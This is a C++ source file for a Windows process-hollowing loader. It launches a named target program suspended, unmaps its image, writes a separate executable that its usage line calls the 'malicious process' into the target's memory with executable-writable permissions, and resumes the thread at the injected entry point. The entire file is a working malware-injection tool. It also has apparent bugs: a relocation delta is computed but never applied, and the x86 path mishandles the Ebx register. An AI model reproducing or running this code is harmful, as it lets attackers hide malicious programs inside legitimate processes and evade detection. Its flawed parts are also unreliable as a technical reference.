#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <winternl.h>
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)
(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
);

void usage(char* argv[]) {
    printf("[+]Usage:%s <target process> <malicious process>\n",argv[0]);
}

int main(int argc, char* argv[])
{

    if (argc != 3) {
        usage(argv);
        return 0;
    }
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    
    /***********************************************************************************|
    |																					|
    | (1) create target process															|
    |																					|
    ************************************************************************************/
    BOOL bSuccess = CreateProcessA(
        NULL,
        (LPSTR)argv[1],
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );
    if (!bSuccess) {
        printf("[-]CreateProcess Failed, Error:%d",GetLastError());
        exit(1);
    }
    printf("continue\n");
    /***********************************************************************************|
    |																					|
    | (2) get target process's image base address										|
    |																					|
    ************************************************************************************/

    /***********************************************|
    | (a) get address of NtQueryInformationProcess 	|
    |												|
    ************************************************/

    HMODULE hNtdll;
    pNtQueryInformationProcess NtQueryInfoProc;
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-]LoadLibrary Failed\n");
        exit(1);
    }
    NtQueryInfoProc = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    printf("NtQueryInformationProcess Address:%p\n", NtQueryInfoProc);
    /***********************************************|
    | (b) get address of target process's PEB		|
    |												|
    ************************************************/
    PROCESS_BASIC_INFORMATION *pBasicInfo = new PROCESS_BASIC_INFORMATION();
    DWORD dwLen = 0;
    NTSTATUS status;
    status = NtQueryInfoProc(
        pi.hProcess,
        ProcessBasicInformation,
        pBasicInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        &dwLen
    );
    if (NT_ERROR(status) || !pBasicInfo->PebBaseAddress) {
        printf("[-]Failed to Get address of target process's PEB");
        exit(1);
    }
    printf("status code:%d\n", status);
    printf("PebBaseAddress:%p\n", pBasicInfo->PebBaseAddress);
    /***********************************************|
    | (c) read PEB and get address					|
    |												|
    ************************************************/
    
    CONTEXT RemoteCtx = { 0 };
    RemoteCtx.ContextFlags = CONTEXT_ALL;
    if (!GetThreadContext(pi.hThread, &RemoteCtx))
    {
        printf("GetThreadContext failed (%d).\n", GetLastError());
        exit(-1);
    }
    PVOID pTgtImageBaseAddr;
    DWORD lpNumberOfBytesRead = 0;

#ifdef _WIN64
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(RemoteCtx.Rdx + 2 * sizeof(SIZE_T)), &pTgtImageBaseAddr, sizeof(PVOID), NULL)) {
        printf("[-]Failed to get target process's PEB, Error Code:%d\n", GetLastError());
        exit(1);
    }
#endif
#ifdef _X86_
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(RemoteCtx.Ebx + 8), &pTgtImageBaseAddr, sizeof(PVOID), NULL)) {
        printf("[-]Failed to get target process's PEB, Error Code:%d\n", GetLastError());
        exit(1);
    }
#endif
    /***********************************************************************************|
    |																					|
    | (3) unmap target process's memory													|
    |																					|
    ************************************************************************************/

    pNtUnmapViewOfSection NtUnmapView;
    NtUnmapView = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    if (NtUnmapView == NULL) {
        printf("[-]Failed to get address of NtUnmapViewOfSection\n");
        goto cleanup;
    }

    /***********************************************|
    | (a) unmap memory								|
    |												|
    ************************************************/
    status = NtUnmapView(
        pi.hProcess,
        pTgtImageBaseAddr
    );
    if (NT_ERROR(status)) {
        printf("[-]NtUnmapViewOfSection Failed, Error code:%d", status);
        goto cleanup;
    }

    /***********************************************************************************|
    |																					|
    | (4) load and parse malicious executable											|
    |																					|
    ************************************************************************************/
    HANDLE hFile;
    DWORD dwFileSize;
    DWORD dwFileReadSize;
    LPVOID lpFileImage;
    hFile = CreateFileA(
        (LPCSTR)argv[2],
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hFile == NULL) {
        printf("[-]CreateFileA Failed, Error code:%d", GetLastError());
        goto cleanup;
    }
    
    dwFileSize = GetFileSize(hFile, NULL);
    printf("dwFileSize:%d\n", dwFileSize);
    lpFileImage = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (lpFileImage == NULL) {
        printf("[-]Failed to VirtualAlloc FileImage\n");
        goto cleanup;
    }
    if (!ReadFile(hFile, lpFileImage, dwFileSize, &dwFileReadSize, NULL)) {
        printf("[-]Failed to ReadFile,Error code:%d\n",GetLastError());
        CloseHandle(hFile);
        goto cleanup;
    }
    CloseHandle(hFile);

    /***********************************************|
    | (a) parse executable's headers				|
    |												|
    ************************************************/
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSecHeaders;
    pDosHeader = (PIMAGE_DOS_HEADER)lpFileImage;
    pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)lpFileImage + pDosHeader->e_lfanew);

    /***********************************************************************************|
    |																					|
    | (5) write executable to target process's memory									|
    |																					|
    ************************************************************************************/

    /***********************************************|
    | (a) allocate memory in target process			|
    |												|
    ************************************************/
    LPVOID pTgtImage;
    DWORD dwDeltaBase; // 如果加载基地址不一致，需要计算增量来重定位
    pTgtImage = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pTgtImage == NULL) {
        printf("[-]failed allocating memory in target executable, Error Code:%d\n", GetLastError());
        goto cleanup;
    }
    dwDeltaBase = (DWORD)pTgtImageBaseAddr - pNtHeader->OptionalHeader.ImageBase;
    printf("dwDeltaBase:%d\n", dwDeltaBase);
    /***********************************************|
    | (b) write headers								|
    |												|
    ************************************************/

    bSuccess = WriteProcessMemory(
        pi.hProcess,
        pTgtImage,
        (LPCVOID)lpFileImage,
        pNtHeader->OptionalHeader.SizeOfHeaders,
        NULL
    );
    if (!bSuccess) {
        printf("[-]Failed writing malicious file's headers, Error Code:%d\n",GetLastError());
        goto cleanup;
    }
    printf("pNtHeader->FileHeader.NumberOfSections:%d\n", pNtHeader->FileHeader.NumberOfSections);
    /***********************************************|
    | (c) write sections							|
    |												|
    ************************************************/
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        pSecHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileImage + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        bSuccess = WriteProcessMemory(
            pi.hProcess,
            (LPVOID)((LPBYTE)pTgtImage + pSecHeaders->VirtualAddress),
            (LPCVOID)((LPBYTE)lpFileImage + pSecHeaders->PointerToRawData),
            pSecHeaders->SizeOfRawData,
            NULL
            );
        if (!bSuccess) {
            printf("[-]Failed to Write Sections, Error Code:%d\n",GetLastError());
            exit(1);
        }
    }

    /***********************************************************************************|
    |																					|
    | (6) set thread context and resume thread											|
    |																					|
    ************************************************************************************/
#ifdef _WIN64
    RemoteCtx.Rcx = (SIZE_T)((LPBYTE)pTgtImage + pNtHeader->OptionalHeader.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (LPVOID)(RemoteCtx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeader->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif // _WIN64
#ifdef _X86_
    RemoteCtx.Ebx = (SIZE_T)((LPBYTE)pTgtImage + pNtHeader->OptionalHeader.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (LPVOID)(RemoteCtx.Ebx + 8), &pNtHeader->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
#endif 
    bSuccess = SetThreadContext(
        pi.hThread,
        (LPCONTEXT)&RemoteCtx
    );
    if (!bSuccess) {
        printf("[-]Failed to set threat context\n");
        goto cleanup;
    }
    /***********************************************|
    | (a) resume thread								|
    |												|
    ************************************************/
    ResumeThread(pi.hThread);
    goto cleanup;

cleanup:
    if (pi.hProcess != NULL) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread != NULL) {
        CloseHandle(pi.hThread);
    }
 
    return 0;
}
